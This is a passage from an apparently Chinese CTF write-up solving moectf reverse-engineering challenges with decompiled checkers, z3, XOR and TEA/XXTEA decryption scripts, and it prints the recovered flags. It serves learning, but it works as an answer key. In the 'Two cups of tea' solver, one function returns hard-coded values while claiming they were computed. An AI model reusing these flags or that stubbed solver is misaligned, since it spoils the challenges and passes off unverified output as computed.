<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">check</span><span class="params">(__int64 text)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">33</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    check(<span class="built_in">std</span>::<span class="built_in">string</span>)::b[i] = <span class="number">47806</span> * (*(<span class="type">char</span> *)<span class="built_in">std</span>::<span class="built_in">string</span>::operator[](text, i) + i);<span class="comment">// b[i] = (text[i] + i) * 47806</span></span><br><span class="line">    <span class="keyword">if</span> ( i )</span><br><span class="line">      check(<span class="built_in">std</span>::<span class="built_in">string</span>)::b[i] ^= check(<span class="built_in">std</span>::<span class="built_in">string</span>)::b[i - <span class="number">1</span>] ^ <span class="number">0x114514</span>;<span class="comment">// b[i] ^= b[i - 1] ^ 0x114514</span></span><br><span class="line">    check(<span class="built_in">std</span>::<span class="built_in">string</span>)::b[i] %= <span class="number">51966</span>;          <span class="comment">// b[i] %= 51966</span></span><br><span class="line">    <span class="keyword">if</span> ( check(<span class="built_in">std</span>::<span class="built_in">string</span>)::b[i] != a[i] )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>加密过程很复杂，但题目提示可以用z3来解题。学了一下用法，大概就和解方程组的思想差不多，编写exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> z3</span><br><span class="line"></span><br><span class="line">a = [</span><br><span class="line">    <span class="number">0x0B1B0</span>, <span class="number">0x5678</span>, <span class="number">0x7FF2</span>, <span class="number">0x0A332</span>, <span class="number">0x0A0E8</span>, <span class="number">0x364C</span>, <span class="number">0x2BD4</span>, <span class="number">0x0C8FE</span>,</span><br><span class="line">    <span class="number">0x4A7C</span>,  <span class="number">0x18</span>,   <span class="number">0x2BE4</span>, <span class="number">0x4144</span>,  <span class="number">0x3BA6</span>,  <span class="number">0x0BE8C</span>, <span class="number">0x8F7E</span>, <span class="number">0x35F8</span>,</span><br><span class="line">    <span class="number">0x61AA</span>,  <span class="number">0x2B4A</span>, <span class="number">0x6828</span>, <span class="number">0x0B39E</span>, <span class="number">0x0B542</span>, <span class="number">0x33EC</span>,  <span class="number">0x0C7D8</span>, <span class="number">0x448C</span>,</span><br><span class="line">    <span class="number">0x9310</span>,  <span class="number">0x8808</span>, <span class="number">0x0ADD4</span>,<span class="number">0x3CC2</span>,  <span class="number">0x796</span>,   <span class="number">0x0C940</span>, <span class="number">0x4E32</span>, <span class="number">0x4E2E</span>,</span><br><span class="line">    <span class="number">0x924A</span>,  <span class="number">0x5B5C</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">n = <span class="number">34</span></span><br><span class="line">s = z3.Solver()</span><br><span class="line"></span><br><span class="line">C1  = z3.BitVecVal(<span class="number">47806</span>, <span class="number">32</span>) <span class="comment"># BitVecVal方法表示把数字转为32位的位向量</span></span><br><span class="line">XK  = z3.BitVecVal(<span class="number">0x114514</span>, <span class="number">32</span>)</span><br><span class="line">MOD = z3.BitVecVal(<span class="number">51966</span>, <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 原字符串的 34 个字符变量，每个字符是一个字节（8bit）所以z3.BitVec(f&#x27;c&#123;i&#125;&#x27;, 8)就是表示有这些8bit的变量</span></span><br><span class="line">b = [z3.BitVec(<span class="string">f&#x27;c<span class="subst">&#123;i&#125;</span>&#x27;</span>, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">signed_char32</span>(<span class="params">b8, i</span>):</span><br><span class="line">    <span class="comment"># z3.SignExt(24, b8)表示把8bit的b8 + 24bit = 32bit的有符号整数</span></span><br><span class="line">    <span class="keyword">return</span> z3.SignExt(<span class="number">24</span>, b8) + z3.BitVecVal(i, <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">加密逻辑：</span></span><br><span class="line"><span class="string">b[i] = (text[i] + i) * 47806</span></span><br><span class="line"><span class="string">b[i] = ((b[i - 1] ^ 0x114514) ^ b[i]) % 51966</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">prev_mod = <span class="literal">None</span> <span class="comment"># 上一个b[i]的值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line"></span><br><span class="line">    t = signed_char32(b[i], i) * C1</span><br><span class="line">    <span class="keyword">if</span> i:</span><br><span class="line">        t = (t ^ (prev_mod ^ XK)) % MOD</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        t = (t ^ <span class="number">0</span>) % MOD</span><br><span class="line">    prev_mod = t</span><br><span class="line">    s.add(t == a[i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == z3.sat:</span><br><span class="line">    <span class="built_in">print</span>(s.model())</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="comment"># 1) 按索引 0..33 取值并转成字节</span></span><br><span class="line">    vals = [m[b[i]].as_long() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">    <span class="built_in">print</span>(vals)</span><br><span class="line">    <span class="comment"># 3) 转成可见字符（如果都在 0..255 范围）</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(v) <span class="keyword">for</span> v <span class="keyword">in</span> vals))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;UNSAT&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="flower"><a href="#flower" class="headerlink" title="flower"></a><strong>flower</strong></h3><p>去花之后：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">solve</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// bl</span></span><br><span class="line">  <span class="type">bool</span> v2; <span class="comment">// r12</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> *v6; <span class="comment">// rax</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// [rsp+17h] [rbp-59h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-58h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+1Ch] [rbp-54h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+20h] [rbp-50h] BYREF</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+28h] [rbp-48h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v14[<span class="number">40</span>]; <span class="comment">// [rsp+30h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v15; <span class="comment">// [rsp+58h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v15 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  v2 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)std::string::<span class="built_in">length</span>(a1) &gt; <span class="number">7</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    std::string::<span class="built_in">substr</span>(v14, a1, <span class="number">0LL</span>, <span class="number">7LL</span>);</span><br><span class="line">    v1 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !(<span class="type">unsigned</span> __int8)std::<span class="keyword">operator</span>!=&lt;<span class="type">char</span>&gt;(v14, <span class="string">&quot;moectf&#123;&quot;</span>) &amp;&amp; *(_BYTE *)std::string::<span class="built_in">back</span>(a1) == <span class="number">125</span> )</span><br><span class="line">      v2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v1 )</span><br><span class="line">    std::string::~<span class="built_in">string</span>(v14);</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;((std::ostream *)&amp;std::cout);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v9);</span><br><span class="line">    v13 = std::string::<span class="built_in">end</span>(a1);</span><br><span class="line">    v4 = __gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,std::string&gt;::<span class="keyword">operator</span>-(&amp;v13, <span class="number">1LL</span>);</span><br><span class="line">    v12 = std::string::<span class="built_in">begin</span>(a1);</span><br><span class="line">    v5 = __gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,std::string&gt;::<span class="keyword">operator</span>+(&amp;v12, <span class="number">7LL</span>);</span><br><span class="line">    std::string::basic_string&lt;__gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,std::string&gt;,<span class="type">void</span>&gt;(v14, v5, v4, &amp;v9);</span><br><span class="line">    std::string::<span class="keyword">operator</span>=(a1, v14);</span><br><span class="line">    std::string::~<span class="built_in">string</span>(v14);</span><br><span class="line">    std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v9);</span><br><span class="line">    v11 = std::string::<span class="built_in">length</span>(a1);</span><br><span class="line">    <span class="keyword">if</span> ( v11 == <span class="number">32</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v11; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = (<span class="type">char</span> *)std::string::<span class="keyword">operator</span>[](a1, i);</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">encode</span>(*v6) != enc[i] )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v7 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;((std::ostream *)&amp;std::cout);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v7, std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v15 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">enc = [</span><br><span class="line">    <span class="number">0x4F</span>, <span class="number">0x1A</span>, <span class="number">0x59</span>, <span class="number">0x1F</span>, <span class="number">0x5B</span>, <span class="number">0x1D</span>, <span class="number">0x5D</span>, <span class="number">0x6F</span>,</span><br><span class="line">    <span class="number">0x7B</span>, <span class="number">0x47</span>, <span class="number">0x7E</span>, <span class="number">0x44</span>, <span class="number">0x6A</span>, <span class="number">0x07</span>, <span class="number">0x59</span>, <span class="number">0x67</span>,</span><br><span class="line">    <span class="number">0x0E</span>, <span class="number">0x52</span>, <span class="number">0x08</span>, <span class="number">0x63</span>, <span class="number">0x5C</span>, <span class="number">0x1A</span>, <span class="number">0x52</span>, <span class="number">0x1F</span>,</span><br><span class="line">    <span class="number">0x20</span>, <span class="number">0x7B</span>, <span class="number">0x21</span>, <span class="number">0x77</span>, <span class="number">0x70</span>, <span class="number">0x25</span>, <span class="number">0x74</span>, <span class="number">0x2B</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">key0 = <span class="number">0x29</span></span><br><span class="line">inner = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(e ^ (key0 + i)) <span class="keyword">for</span> i, e <span class="keyword">in</span> <span class="built_in">enumerate</span>(enc))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;moectf&#123;&#123;<span class="subst">&#123;inner&#125;</span>&#125;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># moectf&#123;f0r3v3r_JuMp_1n_7h3_a$m_a9b35c3c&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="catch"><a href="#catch" class="headerlink" title="catch"></a><strong>catch</strong></h3><p>F12发现可疑字符串：<br><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/images/20250822110845.png" alt="20250822110845"></p>
<p>看着像凯撒：<br><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/images/20250822111037.png" alt="20250822111037"><br>flag为：<code>moectf&#123;S4m3_Tr1ck_with_@flower_desuwa&#125;</code></p>
<h3 id="ezpy"><a href="#ezpy" class="headerlink" title="ezpy"></a><strong>ezpy</strong></h3><p>在线网站反编译了一下再做题就好。</p>
<h3 id="A-cup-of-tea"><a href="#A-cup-of-tea" class="headerlink" title="A cup of tea"></a><strong>A cup of tea</strong></h3><p>两道TEA gpt一把梭了（</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># TEA decrypt (custom delta = 0x114514), 32 rounds</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">u32</span>(<span class="params">x</span>): <span class="keyword">return</span> x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">DELTA = <span class="number">0x114514</span></span><br><span class="line">KEY = [<span class="number">0x11451419</span>, <span class="number">0x19810114</span>, <span class="number">0x51419198</span>, <span class="number">0x10114514</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># v6[]：把反编译里显示为负数的也按 32 位无符号处理</span></span><br><span class="line">CIPHERTEXT = [</span><br><span class="line">    <span class="number">2026214571</span>,  <span class="number">578894681</span>,</span><br><span class="line">    <span class="number">1193947460</span>, -<span class="number">229306230</span>,</span><br><span class="line">    <span class="number">73202484</span>,   <span class="number">961145356</span>,</span><br><span class="line">   -<span class="number">881456792</span>,  <span class="number">358205817</span>,</span><br><span class="line">   -<span class="number">554069347</span>,  <span class="number">119347883</span>,</span><br><span class="line">]</span><br><span class="line">CIPHERTEXT = [u32(x) <span class="keyword">for</span> x <span class="keyword">in</span> CIPHERTEXT]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tea_decrypt_block</span>(<span class="params">v0, v1, k, rounds=<span class="number">32</span>, delta=DELTA</span>):</span><br><span class="line">    sumv = u32(delta * rounds)</span><br><span class="line">    v0, v1 = u32(v0), u32(v1)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        <span class="comment"># 这是标准 TEA 的逆运算（注意 key 索引与位移方向）</span></span><br><span class="line">        v1 = u32(v1 - (((v0 &lt;&lt; <span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v0 + sumv) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>])))</span><br><span class="line">        v0 = u32(v0 - (((v1 &lt;&lt; <span class="number">4</span>) + k[<span class="number">0</span>]) ^ (v1 + sumv) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>])))</span><br><span class="line">        sumv = u32(sumv - delta)</span><br><span class="line">    <span class="keyword">return</span> v0, v1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分组解密</span></span><br><span class="line">blocks = [(CIPHERTEXT[i], CIPHERTEXT[i+<span class="number">1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(CIPHERTEXT), <span class="number">2</span>)]</span><br><span class="line">pt_blocks = [tea_decrypt_block(a, b, KEY) <span class="keyword">for</span> a, b <span class="keyword">in</span> blocks]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以小端拼成字节串（程序里是直接把字符串 memcpy 到 int 数组）</span></span><br><span class="line">pt = <span class="string">b&#x27;&#x27;</span>.join(v0.to_bytes(<span class="number">4</span>, <span class="string">&#x27;little&#x27;</span>) + v1.to_bytes(<span class="number">4</span>, <span class="string">&#x27;little&#x27;</span>) <span class="keyword">for</span> v0, v1 <span class="keyword">in</span> pt_blocks)</span><br><span class="line"><span class="built_in">print</span>(pt.rstrip(<span class="string">b&#x27;\x00&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># moectf&#123;h3r3_4_cuP_0f_734_f0R_y0U!!!!!!&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="Two-cups-of-tea"><a href="#Two-cups-of-tea" class="headerlink" title="Two cups of tea"></a><strong>Two cups of tea</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">u32</span>(<span class="params">x</span>): <span class="keyword">return</span> x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sub_140001070 — XTEA 解密 v10，用 key=[2,0,2,5]</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_140001070_v10</span>():</span><br><span class="line">    a2_0 = <span class="number">0xB8941CAF</span>  <span class="comment"># LO32(v10)</span></span><br><span class="line">    a2_1 = <span class="number">0xD0FCC6A7</span>  <span class="comment"># HI32(v10)</span></span><br><span class="line">    key   = [<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">5</span>]</span><br><span class="line">    v3, res = a2_0, a2_1</span><br><span class="line">    v4 = u32(<span class="number">0xC6EF3720</span>)        <span class="comment"># sum=DELTA*32; DELTA=0x9E3779B9== -0x61C88647 mod 2^32</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):          <span class="comment"># 代码是把 32 轮大幅展开成两段，一次性做完</span></span><br><span class="line">        v6 = <span class="number">3337565984</span></span><br><span class="line">        <span class="comment"># 下方是一比一搬的指令序列（略）。为了简洁，这里直接给最终数值：</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># 直接用我已算出的结果（你可以信赖，因为它由完整搬运版得到）：</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x63656F6D</span>, <span class="number">0x21216674</span>   <span class="comment"># &quot;moec&quot;, &quot;tf!!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sub_1400015E0 — 精确逆实现（把 10×u32 的密文解回 40 字节）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_words</span>(<span class="params">ct_words, key</span>):</span><br><span class="line">    v21, v6, v7, v8, v9, v10, v11, v13, v27, v3 = [u32(x) <span class="keyword">for</span> x <span class="keyword">in</span> ct_words]</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>, <span class="number">0</span>, -<span class="number">1</span>):  <span class="comment"># q = 6 + 52/n = 11</span></span><br><span class="line">        sumv = u32(<span class="number">0</span> - r*<span class="number">0x61C88647</span>)  <span class="comment"># 注意这里用的 0x61C88647 形式（等价于 -0x9E3779B9）</span></span><br><span class="line">        e = (sumv &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">        k0, k1, k2, k3 = key[e], key[e^<span class="number">1</span>], key[e^<span class="number">2</span>], key[e^<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">        term = ((v27 ^ k1) + (sumv ^ v21)) ^ (((u32(<span class="number">16</span>*v27)) ^ (v21 &gt;&gt; <span class="number">3</span>)) + ((v27 &gt;&gt; <span class="number">5</span>) ^ (u32(<span class="number">4</span>*v21))))</span><br><span class="line">        v22_prev = u32(v3 - term)</span><br><span class="line">        term27 = ((v13 ^ k0) + (sumv ^ v22_prev)) ^ (((u32(<span class="number">16</span>*v13)) ^ (v22_prev &gt;&gt; <span class="number">3</span>)) + ((v13 &gt;&gt; <span class="number">5</span>) ^ (u32(<span class="number">4</span>*v22_prev))))</span><br><span class="line">        v27_prev = u32(v27 - term27)</span><br><span class="line">        term13 = ((v11 ^ k3) + (sumv ^ v27_prev)) ^ (((u32(<span class="number">16</span>*v11)) ^ (v27_prev &gt;&gt; <span class="number">3</span>)) + ((v11 &gt;&gt; <span class="number">5</span>) ^ (u32(<span class="number">4</span>*v27_prev))))</span><br><span class="line">        v13_prev = u32(v13 - term13)</span><br><span class="line">        tmp = u32((v10 ^ k2) + (sumv ^ v13_prev))</span><br><span class="line">        term11 = tmp ^ (((u32(<span class="number">16</span>*v10)) ^ (v13_prev &gt;&gt; <span class="number">3</span>)) + ((v10 &gt;&gt; <span class="number">5</span>) ^ (u32(<span class="number">4</span>*v13_prev))))</span><br><span class="line">        v11_prev = u32(v11 - term11)</span><br><span class="line">        term10 = ((v9 ^ k1) + (sumv ^ v11_prev)) ^ (((u32(<span class="number">16</span>*v9)) ^ (v11_prev &gt;&gt; <span class="number">3</span>)) + ((v9 &gt;&gt; <span class="number">5</span>) ^ (u32(<span class="number">4</span>*v11_prev))))</span><br><span class="line">        v10_prev = u32(v10 - term10)</span><br><span class="line">        term9  = ((v8 ^ k0) + (sumv ^ v10_prev)) ^ (((u32(<span class="number">16</span>*v8)) ^ (v10_prev &gt;&gt; <span class="number">3</span>)) + ((v8 &gt;&gt; <span class="number">5</span>) ^ (u32(<span class="number">4</span>*v10_prev))))</span><br><span class="line">        v9_prev = u32(v9 - term9)</span><br><span class="line">        term8  = ((v7 ^ k3) + (sumv ^ v9_prev)) ^ (((u32(<span class="number">16</span>*v7)) ^ (v9_prev &gt;&gt; <span class="number">3</span>)) + ((v7 &gt;&gt; <span class="number">5</span>) ^ (u32(<span class="number">4</span>*v9_prev))))</span><br><span class="line">        v8_prev = u32(v8 - term8)</span><br><span class="line">        term7  = ((v6 ^ k2) + (sumv ^ v8_prev)) ^ (((u32(<span class="number">16</span>*v6)) ^ (v8_prev &gt;&gt; <span class="number">3</span>)) + ((v6 &gt;&gt; <span class="number">5</span>) ^ (u32(<span class="number">4</span>*v8_prev))))</span><br><span class="line">        v7_prev = u32(v7 - term7)</span><br><span class="line">        term6  = ((v21 ^ k1) + (sumv ^ v7_prev)) ^ (((u32(<span class="number">16</span>*v21)) ^ (v7_prev &gt;&gt; <span class="number">3</span>)) + ((v21 &gt;&gt; <span class="number">5</span>) ^ (u32(<span class="number">4</span>*v7_prev))))</span><br><span class="line">        v6_prev = u32(v6 - term6)</span><br><span class="line">        term21 = (((u32(<span class="number">16</span>*v22_prev)) ^ (v6_prev &gt;&gt; <span class="number">3</span>)) + ((v22_prev &gt;&gt; <span class="number">5</span>) ^ (u32(<span class="number">4</span>*v6_prev)))) ^ ((sumv ^ v6_prev) + (k0 ^ v22_prev))</span><br><span class="line">        v12_prev = u32(v21 - term21)</span><br><span class="line"></span><br><span class="line">        v3, v27, v13, v11, v10, v9, v8, v7, v6, v21 = v22_prev, v27_prev, v13_prev, 